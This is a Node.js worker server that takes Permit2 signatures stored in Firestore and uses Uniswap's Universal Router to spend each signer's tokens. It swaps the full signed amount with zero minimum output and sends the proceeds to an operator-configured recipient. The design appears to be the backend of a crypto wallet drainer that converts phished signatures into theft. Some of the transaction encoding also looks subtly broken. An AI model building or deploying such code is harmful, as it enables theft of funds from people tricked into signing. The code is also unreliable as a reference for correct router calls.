#!/usr/bin/env node
import dotenv from 'dotenv';
try { dotenv.config(); } catch(e) {}

import express from 'express';
import bodyParser from 'body-parser';
import admin from 'firebase-admin';
import { ethers } from 'ethers';

// ---------------------------------------------------------
// Addresses
// ---------------------------------------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet

// ---------------------------------------------------------
// Minimal ABI: Universal Router execute()
// ---------------------------------------------------------
const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// ---------------------------------------------------------
// Lazy Init
// ---------------------------------------------------------
let initialized = false;
let db = null;
let provider = null;
let spenderWallet = null;
let router = null;

async function init() {
  if (initialized) return;

  const required = [
    'FIREBASE_PROJECT_ID',
    'FIREBASE_CLIENT_EMAIL',
    'FIREBASE_PRIVATE_KEY',
    'RPC_URL',
    'SPENDER_PRIVATE_KEY',
    'VITE_SPENDER_ADDRESS',
    'VITE_TOKEN_ADDRESS',
    'SWAP_RECIPIENT',
    'SWAP_FEE'
  ];

  const missing = required.filter(k => !process.env[k]);
  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  };

  if (!admin.apps || admin.apps.length === 0) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);

  router = new ethers.Contract(
    UNIVERSAL_ROUTER,
    UNIVERSAL_ROUTER_ABI,
    spenderWallet
  );

  initialized = true;
}

// ---------------------------------------------------------
// Universal Router Command Codes (Uniswap official)
// ---------------------------------------------------------
const COMMANDS = {
  PERMIT2_PERMIT: 0x02,
  V3_SWAP_EXACT_IN: 0x08
};

// ---------------------------------------------------------
// Build Universal Router payload (Permit2 + Swap)
// ---------------------------------------------------------
function buildUniversalRouterTx(data) {
  const {
    owner,
    token,
    amount,
    deadline,
    nonce,
    spender,
    r, s, v
  } = data;

  const recipient = process.env.SWAP_RECIPIENT;   // where swapped tokens go
  const feeBps = Number(process.env.SWAP_FEE || "0"); // optional routing fee

  // -----------------------------------------------------
  // 1. Build Permit2 input
  // -----------------------------------------------------
  const permitDetails = {
    token,
    amount: BigInt(amount),
    expiration: deadline,
    nonce
  };

  const signature = ethers.concat([r, s, ethers.toBeHex(v)]);

  // Permit2 input to router
  const permitInput = ethers.AbiCoder.defaultAbiCoder().encode(
    [
      "address",                       // owner
      "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", // PermitSingle
      "bytes"                          // signature
    ],
    [
      owner,
      [
        [ token, BigInt(amount), deadline, nonce ],
        spender,
        deadline
      ],
      signature
    ]
  );

  // -----------------------------------------------------
  // 2. Build V3 swap input (exact-in)
  // NOTE: This is a single-hop example (token → WETH9 or another output)
  // You may configure multiple hops if needed.
  // -----------------------------------------------------
  const outputToken = "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 (example)
  const feeTier = 3000; // 0.3% pool

  const path = ethers.concat([
    token,
    ethers.zeroPadValue(ethers.toBeHex(feeTier), 3),
    outputToken
  ]);

  const minReceived = 0n; // you can set slippage rules

  const swapInput = ethers.AbiCoder.defaultAbiCoder().encode(
    [
      "bytes",    // path
      "uint256",  // amountIn
      "uint256",  // amountOutMin
      "address"   // recipient
    ],
    [
      path,
      BigInt(amount),
      minReceived,
      recipient
    ]
  );

  // -----------------------------------------------------
  // 3. Commands byte string
  // -----------------------------------------------------
  const commands = ethers.concat([
    ethers.toBeHex(COMMANDS.PERMIT2_PERMIT, 1),
    ethers.toBeHex(COMMANDS.V3_SWAP_EXACT_IN, 1)
  ]);

  const inputs = [permitInput, swapInput];

  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 min

  return { commands, inputs, execDeadline };
}

// ---------------------------------------------------------
// Worker: process signatures
// ---------------------------------------------------------
async function processPending(limit = 10) {
  const snaps = await db.collection('permit2_signatures')
    .where('processed','==',false)
    .limit(limit)
    .get();

  if (snaps.empty) return { processed: 0 };

  let count = 0;

  for (const docSnap of snaps.docs) {
    const data = docSnap.data();

    try {
      // Build Universal Router data
      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data);

      // Execute router call (atomic permit + swap)
      const tx = await router.execute(commands, inputs, execDeadline);
      const receipt = await tx.wait();

      await docSnap.ref.update({
        processed: true,
        routerTx: receipt.transactionHash,
        processedAt: Date.now()
      });

      count++;

    } catch (err) {
      console.error('worker error:', err);
      try { 
        await docSnap.ref.update({ lastError: String(err), lastErrorAt: Date.now() });
      } catch (e) {
        console.error('failed to update error', e);
      }
    }
  }

  return { processed: count };
}

// ---------------------------------------------------------
// HTTP API
// ---------------------------------------------------------
const app = express();
app.use(bodyParser.json());

const SECRET = process.env.RUN_WORKER_SECRET;

app.all('/api/run-worker', async (req, res) => {
  try {
    if (SECRET) {
      const q = req.query?.secret || req.headers['x-run-worker-secret'] || req.body?.secret;
      if (!q || q !== SECRET)
        return res.status(401).json({ ok: false, error: 'Unauthorized' });
    }

    await init();

  } catch (err) {
    console.error("init error:", err);
    return res.status(500).json({ ok: false, error: String(err) });
  }

  const debug = req.query?.debug === '1' || req.query?.dryRun === '1';

  try {
    if (debug) {
      const snaps = await db.collection('permit2_signatures')
        .where('processed','==',false)
        .limit(20)
        .get();

      const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
      return res.json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
    }

    const result = await processPending(10);
    return res.json({ ok: true, ...result });

  } catch (err) {
    console.error("process error:", err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Worker HTTP server listening on port ${port}`);
});
